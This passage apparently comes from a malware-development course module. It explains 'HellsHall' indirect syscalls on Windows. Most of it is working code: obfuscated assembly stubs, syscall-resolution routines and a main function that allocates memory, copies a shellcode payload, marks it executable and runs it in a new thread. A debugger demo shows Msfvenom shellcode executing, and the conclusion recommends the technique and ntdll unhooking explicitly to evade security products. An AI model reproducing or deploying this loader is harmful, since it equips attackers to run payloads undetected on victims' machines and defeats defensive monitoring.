</code></pre><h3 id="7f253824-f33d-4fe2-8575-72bb98c9eac9" class=""><strong>Obfuscated Assembly Functions</strong></h3><p id="a1c94885-1c38-4e13-aea4-542bd47bfceb" class=""><code>SetSSN</code> &amp; <code>RunSyscall</code> with added assembly instructions.</p><pre id="361f9394-c181-42c5-9cf4-5b15f2df9cdd" class="code code-wrap"><code>.data
	wSystemCall         DWORD	0h
	qSyscallInsAdress   QWORD	0h


.code

        SetSSn proc
		xor eax, eax                          ; eax = 0
		mov wSystemCall, eax                  ; wSystemCall = 0
		mov qSyscallInsAdress, rax            ; qSyscallInsAdress = 0
		mov eax, ecx                          ; eax = ssn
		mov wSystemCall, eax                  ; wSystemCall = eax = ssn
		mov r8, rdx                           ; r8 = AddressOfASyscallInst
		mov qSyscallInsAdress, r8             ; qSyscallInsAdress = r8 = AddressOfASyscallInst
		ret
        SetSSn endp


        RunSyscall proc
		xor r10, r10                          ; r10 = 0
		mov rax, rcx                          ; rax = rcx
		mov r10, rax                          ; r10 = rax = rcx
		mov eax, wSystemCall                  ; eax = ssn
		jmp Run                               ; execute &#x27;Run&#x27;
		xor eax, eax      ; wont run
		xor rcx, rcx      ; wont run
		shl r10, 2        ; wont run
	Run:
		jmp qword ptr [qSyscallInsAdress]   ; jumping to the &#x27;syscall&#x27; instruction
		xor r10, r10                        ; r10 = 0
		mov qSyscallInsAdress, r10          ; qSyscallInsAdress = 0
		ret
      RunSyscall endp

end
</code></pre><h3 id="d883677f-67f3-4c1b-b2ba-e07244efa5ca" class=""><strong>Creating a Helper Macro</strong></h3><p id="1e9ce3c2-3ba0-4d7d-8fdb-f38ce64794b6" class="">As mentioned, the <code>SetSSn</code> function now requires two parameters from the initialized <code>NT_SYSCALL</code> structure, which are <code>NT_SYSCALL.dwSSn</code> and <code>NT_SYSCALL.pSyscallInstAddress</code>. To invoke the <code>SetSSn</code> function more easily, the <code>SET_SYSCALL</code> macro is created and shown below.</p><pre id="31669a36-09d6-477e-9e46-9bbd4aad811e" class="code code-wrap"><code>#define SET_SYSCALL(NtSys)(SetSSn((DWORD)NtSys.dwSSn,(PVOID)NtSys.pSyscallInstAddress))</code></pre><p id="e6d270c8-9abf-42c0-831a-fcb8ad5af0a4" class=""><code>SET_SYSCALL</code> takes an <code>NT_SYSCALL</code> structure and calls the <code>SetSSn</code> function, making the code neater. For example, the following snippets show <code>SetSSn</code> being called directly versus when using the <code>SET_SYSCALL</code> macro.</p><p id="27e9b1cc-fab9-4a43-8120-7003291c6cca" class=""><strong>Direct SetSSn Call</strong></p><pre id="6399f228-1e33-4420-9e04-b0ae2d330c8a" class="code code-wrap"><code>  NT_SYSCALL NtAllocateVirtualMemory = { 0 };
  FetchNtSyscall(NtAllocateVirtualMemory_Hash, &amp;NtAllocateVirtualMemory);

  SetSSn(NtAllocateVirtualMemory.dwSSn, NtAllocateVirtualMemory.pSyscallInstAddress);
  RunSyscall(/* NtAllocateVirtualMemory&#x27;s parameters */);
</code></pre><p id="517d5762-5415-4ff2-a373-4f7c86fc0859" class=""><strong>Using SET_SYSCALL</strong></p><pre id="c322a5f4-6bb1-4992-9fcb-a16b52b90d21" class="code code-wrap"><code>  NT_SYSCALL NtAllocateVirtualMemory = { 0 };
  FetchNtSyscall(NtAllocateVirtualMemory_Hash, &amp;NtAllocateVirtualMemory);

  SET_SYSCALL(NtAllocateVirtualMemory);
  RunSyscall(/* NtAllocateVirtualMemory&#x27;s parameters */);
</code></pre><h3 id="b4599c68-7029-460e-9c16-f1bef0481fda" class=""><strong>Updating Main Function</strong></h3><h3 id="6106398b-2921-4e02-8e70-d4e8f568d425" class=""><strong>Initializing The NTAPI_FUNC Structure</strong></h3><p id="43238d60-2bff-4da5-ba64-7f8181819fd9" class="">Similarly to the previous module, all the invoked syscalls will be saved in a global <code>NTAPI_FUNC</code> structure.</p><pre id="b3f7c6bb-4847-4fe0-88a3-6888305f38a0" class="code code-wrap"><code>typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtAllocateVirtualMemory;
	NT_SYSCALL	NtProtectVirtualMemory;
	NT_SYSCALL	NtCreateThreadEx;
	NT_SYSCALL	NtWaitForSingleObject;

}NTAPI_FUNC, *PNTAPI_FUNC;

// global variable
NTAPI_FUNC g_Nt = { 0 };
</code></pre><h3 id="5e50a21b-6885-43fd-b64d-37573b035873" class=""><strong>Creating InitializeNtSyscalls</strong></h3><p id="7cf1b829-12af-48b5-b909-550ed519b2da" class="">To populate the <code>g_Nt</code> global variable, the newly created function, <code>InitializeNtSyscalls</code>, will call <code>FetchNtSyscall</code> to initialize all members of <code>NTAPI_FUNC</code>.</p><pre id="417cbe03-a6b3-468a-8d34-cc3088de4e55" class="code code-wrap"><code>BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &amp;g_Nt.NtAllocateVirtualMemory)) {
		printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n&quot;);
		return FALSE;
	}
	printf(&quot;[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t\t&gt;&gt; Executing &#x27;syscall&#x27; instruction Of Address : 0x%p\n&quot;, g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);


	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &amp;g_Nt.NtProtectVirtualMemory)) {
		printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n&quot;);
		return FALSE;
	}
	printf(&quot;[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n\t\t&gt;&gt; Executing &#x27;syscall&#x27; instruction Of Address : 0x%p\n&quot;, g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallInstAddress);


	if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &amp;g_Nt.NtCreateThreadEx)) {
		printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n&quot;);
		return FALSE;
	}
	printf(&quot;[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n\t\t&gt;&gt; Executing &#x27;syscall&#x27; instruction Of Address : 0x%p\n&quot;, g_Nt.NtCreateThreadEx.dwSSn, g_Nt.NtCreateThreadEx.pSyscallInstAddress);


	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &amp;g_Nt.NtWaitForSingleObject)) {
		printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n&quot;);
		return FALSE;
	}
	printf(&quot;[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n\t\t&gt;&gt; Executing &#x27;syscall&#x27; instruction Of Address : 0x%p\n&quot;, g_Nt.NtWaitForSingleObject.dwSSn, g_Nt.NtWaitForSingleObject.pSyscallInstAddress);

	return TRUE;
}
</code></pre><h3 id="82cf1cab-9f07-4ecf-96b8-9fd7b5902f54" class=""><strong>Main Function</strong></h3><pre id="e3c24146-59a2-4f4f-88fa-eb9144bb95ce" class="code code-wrap"><code>int main() {

	NTSTATUS	STATUS		= NULL;
	PVOID		pAddress	= NULL;
	SIZE_T		sSize		= sizeof(Payload);
	DWORD		dwOld		= NULL;
	HANDLE		hProcess	= (HANDLE)-1,	// local process
		        hThread		= NULL;



	// initializing the used syscalls
	if (!InitializeNtSyscalls()) {
		printf(&quot;[!] Failed To Initialize The Specified Indirect-Syscalls \n&quot;);
		return -1;
	}


	// allocating memory
	SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
		printf(&quot;[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n&quot;, STATUS);
		return -1;
	}


	// copying the payload
	memcpy(pAddress, Payload, sizeof(Payload));
	sSize = sizeof(Payload);


	// changing memory protection
	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &amp;pAddress, &amp;sSize, PAGE_EXECUTE_READ, &amp;dwOld)) != 0x00) {
		printf(&quot;[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n&quot;, STATUS);
		return -1;
	}


	// executing the payload
	SET_SYSCALL(g_Nt.NtCreateThreadEx);
	if ((STATUS = RunSyscall(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
		printf(&quot;[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n&quot;, STATUS);
		return -1;
	}


	// waiting for the payload
	SET_SYSCALL(g_Nt.NtWaitForSingleObject);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
		printf(&quot;[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n&quot;, STATUS);
		return -1;
	}


	printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
	getchar();

	return 0;
}
</code></pre><h3 id="28b2a8d7-5e36-46ff-81ee-91491e5a5c10" class=""><strong>Demo</strong></h3><ul id="e7da0207-e972-4d61-8288-6d67a5a811ea" class="bulleted-list"><li style="list-style-type:disc">Running the HellsHall implementation while attached to xdbg.<figure id="8b70f01b-a9f1-4426-9045-c7b335ecf7a8" class="image"><a href="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-319330695-e31df2e8-be16-4b00-a1b7-81fd36bfc967.png"><img style="width:1835px" src="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-319330695-e31df2e8-be16-4b00-a1b7-81fd36bfc967.png"/></a></figure><p id="989889b7-48bc-4536-bc00-79ab1cb4c720" class="">• <code>NtAllocateVirtualMemory</code> is using <code>NtReleaseMutant</code>&#x27;s <code>syscall</code> instruction which is at address <code>0x00007FF8308E3F82</code>. A breakpoint is placed at this address, in order to track code execution.</p><figure id="9783fcd1-78dd-4b83-a062-caf74171a664" class="image"><a href="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-419334075-bc9f1b1c-0c8c-49e4-988d-153d35a71ebd.png"><img style="width:1858px" src="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-419334075-bc9f1b1c-0c8c-49e4-988d-153d35a71ebd.png"/></a></figure><p id="61e06c5a-d14a-4fd1-8a0a-43c8179cf369" class=""><code>NtProtectVirtualMemory</code> is using <code>NtReleaseMutant</code>&#x27;s <code>syscall</code> instruction which is at address <code>0x00007FF8308E4682</code>. Again, a breakpoint is placed at this address, in order to track code execution.</p><figure id="2fe7289c-1a36-449f-b148-ffae646bf1c0" class="image"><a href="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-519334085-48c45634-cf64-478d-9091-932eb275f419.png"><img style="width:1850px" src="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-519334085-48c45634-cf64-478d-9091-932eb275f419.png"/></a></figure><p id="268f6e46-0c53-42e2-8834-94ad296f4942" class="">• Executing <code>NtAllocateVirtualMemory</code> triggers the breakpoint and shows that the <code>syscall</code> instruction is executed from within <code>ntdll.dll</code>.</p><figure id="63e9821e-c8fb-4d62-a5fc-2a1586bc07c4" class="image"><a href="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-619334089-413a5cbd-32fb-457b-8546-6f5f2036c320.png"><img style="width:1242px" src="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-619334089-413a5cbd-32fb-457b-8546-6f5f2036c320.png"/></a></figure><p id="3931394a-3248-401e-8768-69758eea0bdd" class="">• Executing <code>NtProtectVirtualMemory</code> triggers the breakpoint and shows that the <code>syscall</code> instruction is executed from within <code>ntdll.dll</code>.</p><figure id="64940d92-b0da-4f0d-8fd3-e2e4afc3f4bd" class="image"><a href="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-719334094-24709fd0-3009-44af-bef7-acf53e0c7872.png"><img style="width:1221px" src="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-719334094-24709fd0-3009-44af-bef7-acf53e0c7872.png"/></a></figure><p id="52f326a1-4080-4533-9920-5ecfb86acc3f" class="">• Finally, the payload executes the Msfvenom shellcode.</p><figure id="af6d181c-a0a4-47c9-9992-0149f880b939" class="image"><a href="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-819334105-80f7d3a7-1de2-45bd-81e3-e2703efd8b2e.png"><img style="width:1427px" src="89%20Indirect%20Syscalls%20-%20HellsHall%2094f45eeb837f4eb6829f55eb1d6c20dc/indirect-syscalls-819334105-80f7d3a7-1de2-45bd-81e3-e2703efd8b2e.png"/></a></figure><h3 id="f1b56af0-e04a-47cc-986f-5f5641c195a2" class=""><strong>Conclusion</strong></h3><p id="ed1de0e9-69dc-4b23-b7c9-4c29dcf44c66" class="">The best approach is to use the implementation of HellsHall in order to evade detection due to direct syscalls being detected with security solutions. To further enhance evasion capabilities, it is recommended to unhook <code>ntdll.dll</code> using HellsHall, as this will ensure that payloads that trigger hooked functions can run unhooked.</p><p id="7f8deb24-989c-471d-a75f-e27d6cfbfb10" class="">Note that a public version of HellsHall exists on <a href="https://github.com/Maldev-Academy/HellHall">GitHub</a> but lacks several features. The one explained in this module contains far more features.</p></li></ul></div></article></body></html>